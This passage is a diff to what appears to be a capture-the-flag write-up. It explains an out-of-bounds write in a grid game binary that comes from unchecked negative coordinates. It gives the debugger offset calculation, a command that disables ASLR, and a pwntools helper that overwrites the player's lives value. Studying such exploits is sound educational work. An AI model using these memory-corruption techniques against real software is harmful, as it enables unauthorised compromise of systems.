@@ -3305,6 +3305,200 @@ But if that's not the case it updates the current value of the player on the map
 
 And returns........
 
+Ok that's all the important function i wanted to show 
+
+Now that we are harmed with this information what exactly is the bug?
+
+You can try to find it but if you can't do that here's the bug:
+
+```c
+map[player->x + player->y * 0x5a] = player_tile;
+```
+
+While updating our player's character, it does that based on the position of the character on the map
+
+It calculates the position using the player's `x and y` value
+
+But there's nothing stopping us from using a negative value of x or y 
+
+Here's an example, if x is at -1 and y is at 0
+
+The position would then be:
+
+```
+map[-1 + (0 * 90)]
+map[-1 + 0]
+map[-1]
+```
+
+With that we have out of bound write
+
+Out of bound meaning we can make arbitrary writes out of the map array bound?
+
+But looking back at the pseudocode well we can find a problem which is this
+
+```
+map[player->x + player->y * 0x5a] = '.';
+```
+
+It would set the previous value of the map character to `.`
+
+So let's say we are at `map[0]` and we move to `map[-1]` the value stored in `map[0]` would be set to `.` same as when we move from `map[-1]` to `map[-2]` the value stored there at `map[-1]` would be set to `.`
+
+What that is doing is going to prevent us from making arbitrary write to memory but that doesn't stop us because we still control one byte
+
+Therefore if we are to overwrite any value on the stack it would just one byte we would be overwritting
+
+Now even if we could overwrite an address with just a byte what do we want to do with that?
+
+Remember from the main function that weird condition which prevents us from making level to 5 and i to 4, how do we also go about that?
+
+Inorder to deal with all this issue we first need to be able to move around the map freely because we have very limited lives
+
+So my first goal would be to overwrite the `players->lives` value to a large number
+
+Firstly let's disable ASLR so that the addresses would be the same as it makes calculating offsets easier
+
+```
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+Ok now how did I calculate the offset of `map -> lives`
+
+Looking at the main function before it called `print_map` the parameter passed into the function are `map, players's structure, level`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/22eaaef2-af98-4609-9320-8891cfd75fbc)
+
+So I set a breakpoint at the call to `print_map` and after starting the process I hit the breakpoint and got this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46d90448-edc9-4cc5-946b-e30b80651af3)
+
+```
+ ► 0x80498e9 <main+120>    call   print_map                     <print_map>
+        arg[0]: 0xffffc3ef ◂— 0x2e2e2e23 ('#...')
+        arg[1]: 0xffffc3e0 ◂— 0x4
+        arg[2]: 0xffffc3dc ◂— 0x1
+```
+
+Ok from this we know that:
+
+```
+map == 0xffffc3ef
+player-> lives = 0xffffc3e0+8
+level == 0xffffc3dc
+```
+
+So now i calculated the offset of the map to the player->lives structure to be:
+
+```
+= player->lives - map
+= 0xffffc3e8-0xffffc3ef
+= -7
+```
+
+That means if we go to `map[-7]` it would be the address of `player->lives`
+
+In order to achieve this we need to set `x` to `-6` and `y` to `0`
+
+```
+map[x + (y * 90)]
+map[-6 + 0]
+map[-6]
+```
+
+Also remember that the initial position of (x, y) are (4, 4)
+
+So that means to reach `-6` we need to move `x` to `a*10` and `y` to `w*4`
+
+You may notice I used -6 instead of -7 the reason is because of this
+
+Let's say the address of `player->lives` is `0xffffc3e8` 
+
+And it contains this:
+
+```
+0xffffc3e8: 0x00000031
+```
+
+If we overwrite `-7` that's going to be the lsb of that address meaning it would just eventually overwrite `0x31` to our current player character then if we move again around the map it would replace `0x31` with `0x2e --> '.'`
+
+That would rather decrease the live so rather than overwriting the lsb i overwrote it to be:
+
+```
+0xffffc3e8: 0x00002e31
+```
+
+Ok now with that said I did just that
+
+Here's the wrapper function I made use of
+
+```python
+class Player:
+    def __init__(self, y, x):
+        self.x = x
+        self.y = y
+
+    def get_position(self):
+        return (self.x, self.y)
+    
+    def get_relative_index(self):
+        return self.x + (self.y * 0x5a)
+    
+    def move(self, direction):
+        match direction:
+            case 'a':
+                self.x -= 1
+            case 'd':
+                self.x += 1
+            case 'w':
+                self.y -= 1
+            case 's':
+                self.y += 1
+        
+        log.info(f'Player position (x, y): {self.get_position()} | map[{self.get_relative_index()}]')
+
+def read_map():
+    return io.recv(0x6c7)
+
+
+def send_movement(player, direction, read=True):
+    io.send(direction)
+    str_direction = direction.decode('utf-8')
+    log.info(f'Sending {str_direction}')
+    for c in str_direction:
+        player.move(c)
+        if read: read_map()
+
+def change_tile_character(lower_byte):
+    io.send(b'l' + lower_byte)
+    log.info(f'Changing tile to: {lower_byte.decode("utf-8")}')
+    # read_map()
+
+def solve():
+    player = Player(4, 4)
+
+    def get_lives():
+        """
+        Get large amount of lives
+        """
+        send_movement(player, b'a'*10)
+        send_movement(player, b'w'*4)
+
+        # {-7, 0}
+
+    def reset_live():
+        """
+        Reset the co-ordinates to (4, 4)
+        """
+        send_movement(player, b's'*4)
+        send_movement(player, b'd'*10)
+
+    get_lives()
+```
+
+Btw we are basically taking advantage of the fact that it will update the previous location of the map to the current player tile character to get larger lives
+
+Now after that we can get large lives
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1b7b9a9-7b1f-458c-9c7a-976e0df32402)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c194a64-8177-4a1c-b696-8aa1480c7fae)
 
 
 
